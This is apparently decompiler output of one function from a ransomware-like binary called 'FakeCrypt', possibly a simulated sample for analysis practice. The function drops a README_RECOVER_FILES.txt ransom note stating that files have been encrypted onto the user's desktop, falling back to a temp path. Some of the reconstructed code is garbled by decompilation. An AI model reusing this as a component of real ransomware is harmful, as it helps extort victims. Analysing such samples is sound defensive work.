
  fn FakeCrypt::fileops::drop_ransom_note::h4942ecd79881b15c() -> i64

{
    let mut var_60: i64;
    dirs::desktop_dir::h701c4228176dceaf(&var_60);
    let mut var_48: i128;
    let mut var_38: u64;
    
    if !(0 + -(var_60))
    {
        let var_50: u64;
        var_38 = var_50;
        var_48 = var_60;
    }
    else
    {
        std::sys::pal::unix::os::split_paths::bytes_to_path::ha41ef6b22d0f7a09(&var_48, 
            "/tmp_DIRKindboolmut kind/", 4);
    }
    
    let mut var_28: ();
    std::path::Path::join::h92d580baf012382b(&var_28, *var_48[8], var_38, 
        "README_RECOVER_FILES.txt");
    std::fs::File::create::h34a10c1ae837220b(&var_60, &var_28);
    let rbp: i32 = var_60;
    
    if rbp != 1
    {
        let mut fd: i32 = *var_60[4];
        core::ptr::drop_in_place$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$::h52eca53ec7fb34e8(std::io::Write::write_all::h61cad997d75bad86(&fd, "\nYour files have been encrypted…", 
            0x8a));
        core::ptr::drop_in_place$LT$std..fs..File$GT$::hfc222f4db551af96(fd);
    }
    
    let result: i64 =
        core::ptr::drop_in_place$LT$std..path..PathBuf$GT$::hff597253ed3a0574(&var_48);
    
    if rbp == 0
    {
        return result;
    }
    
    core::ptr::drop_in_place$LT$core..result..Result$LT$std..fs..File$C$std..io..error..Error$GT$$GT$::h3f5dd9ad240898e4(&var_60)
}
